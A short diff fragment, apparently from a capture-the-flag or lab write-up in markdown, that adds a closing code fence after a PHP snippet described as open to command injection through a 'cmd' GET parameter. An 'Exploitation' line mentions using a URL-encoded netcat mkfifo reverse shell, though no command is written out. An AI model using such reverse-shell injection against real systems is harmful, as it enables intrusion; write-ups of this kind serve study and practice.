@@ -290,7 +290,7 @@ This PHP script is vulnerable to **command injection** via the `cmd` GET paramet
            echo base64_encode( $value);
         }
 ?>
-
+```
 
 ## Exploitation
 > i use `nc mkfifo` found in revshell.com with URL encoded 
